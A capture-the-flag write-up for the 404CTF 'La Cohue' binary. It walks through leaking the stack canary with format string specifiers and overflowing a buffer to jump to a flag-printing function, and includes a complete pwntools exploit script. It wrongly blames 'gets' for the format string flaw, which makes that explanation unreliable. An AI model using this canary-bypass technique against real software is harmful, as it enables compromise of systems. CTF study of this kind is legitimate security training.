# La Cohue

In this challenge, we are given an `ELF` executable available [here](https://github.com/Nouman404/nouman404.github.io/blob/main/_posts/CTFs/404CTF_2023/Pwn/la_cohue). If we look at the code in Ghidra, we can see a `canary` function that prints the flag. The executable allows us to discuss with `Francis` that lost his `canary`. With all of this `canaries`, we can guess that this challenge want us to do a buffer overflow and bypass the canary.

As we can see in the code, there is the `gets` function that will print our input. `gets` function in C is vulnerable to format string attacks. The `gets` function is used to read a line of input from the standard input and store it into a buffer. However, it does not perform any bounds checking on the input, making it susceptible to buffer overflows and format string vulnerabilities.

We can try using a basic payload like `%p` to see if anything happens:

As we can see, we have an address displayed. We can continue to do so until we find the address of the `canary`. The address of the canary is easy to find, it is the only one that finish with some zeros at the end. We can use `%i$p` where `i` is an integer. This is used to read the value from a specific position on the stack. Here's a breakdown of the notation:
```
%i: It specifies the position of the address we will display
$p: It indicates that the value to be printed is fetched from the stack at a specific position indicated by the integer value i.
```

So we can do for example `%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p`:

We don't see anything interesting here. The strings at the end that look like `0x2432252070243125` are just our input. If we decode `0x2432252070243125` to ASCII characters, we get `$2% p$1%`. We can continue with the values from `11` to `20` and we have:

We can see that the address at position `%17` is `0xea9dd891cb4be500` wich ends with `00`. This may be our address. We can run it a second time to confirm that it is the good one:

As we can see, the address changed but still ends with two zeros. This should be the address of our `canary`. Because there is no ASLR on this program, we can get the address of the `canary` function using Ghidra or Gdb:

Now, for our payload to work correctely, we need to find the offset value, that can be found in the `choice` function:

Now we have everything we need. We can use the following code to get the flag:

```python
from pwn import *
warnings.filterwarnings("ignore", category=BytesWarning)
#io = process("la_cohue")
io = remote("challenges.404ctf.fr", 30223)

io.sendline("2")
# try with %10$ ... %20$p => find an address like 0x...00 => this address is the canary address
io.sendline("%17$p ")

io.recvuntil("[Vous] : ")
addr_canary = io.recvline()[:-1].decode()
print("@ canary:", addr_canary)

#String to hex
addr_canary = int(addr_canary, 16)
#convert to address format
addr_canary = p64(addr_canary)

aff = io.recvuntil(">>> ")
#address of the function named Canary (found in Ghidra or objdump -d | grep canary)
addr_fct_canary = p64(0x00400877)

offset = 72
payload = b"A" * offset + addr_canary + 8* b"A" + addr_fct_canary

io.sendline("1")
io.recvuntil("[Vous] : ")
io.sendline(payload)
print(io.recvline().decode())
io.recvuntil(">>> ").decode()
io.sendline("3")
print(io.recvline().decode())

print("Flag : "+io.recvline().decode())
```

We get the flag `404CTF{135_C4N4r15_41M3N7_14_C0MP46N13_N3_135_141553Z_P45_53U15}`
